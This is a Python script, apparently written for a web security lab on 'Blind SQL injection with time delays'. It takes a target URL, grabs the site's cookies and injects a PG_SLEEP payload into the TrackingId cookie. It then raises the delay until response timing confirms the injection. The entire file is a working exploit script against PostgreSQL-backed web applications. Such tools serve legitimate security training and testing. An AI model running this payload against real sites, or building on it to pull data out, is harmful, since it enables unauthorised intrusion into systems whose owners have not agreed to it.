import requests
import sys
import urllib.parse
import getopt
from halo import Halo


def injection(url, trackingId, session):
  number = 10

  while True:
    payload = f"'||PG_SLEEP({number})--"
    payload = urllib.parse.quote_plus(payload)
    cookies = {"TrackingId": trackingId + payload, "session": session}
    response = requests.get(url, cookies=cookies)
    response_time = int(response.elapsed.total_seconds()) 

    if response_time >= number:
      return 1
    else:
      number += 10


def get_cookie(url):
  session = requests.Session()
  response = session.get(url)
  cookies = session.cookies.get_dict()
  values = list(cookies.values())
  trackingId = values[0]
  session = values[1]
  return trackingId, session 


def main(argv):
  help_message = "This is the script for:\n'Blind SQL injection with time delays'\n\nUsage: python3 bsqli-3.py -u <url>"

  try:
    opts, args = getopt.getopt(argv, "hu:")
  except getopt.GetoptError:
    print(help_message) 
    print("\x1b[?25h", end="") # Make cursor visible 
    sys.exit(2)

  for opt, arg in opts:
    if opt == "-u":
      url = arg
      trackingId, session = get_cookie(url)
    elif opt == "-h":
      print(help_message) 
      print("\x1b[?25h", end="") # Make cursor visible 
      sys.exit()

  # Create and start spinner animation
  spinner = Halo(text="Testing Injection...", spinner="bouncingBar")
  spinner.start()
  # Test the injection
  injection(url, trackingId, session)
  # Finish spinner
  spinner.succeed(f"Blind SQL Injection successful")


if __name__ == "__main__":
  print("\x1b[?25l", end="") # Hide cursor
  main(sys.argv[1:])
  print("\x1b[?25h", end="") # Make cursor visible
  sys.exit()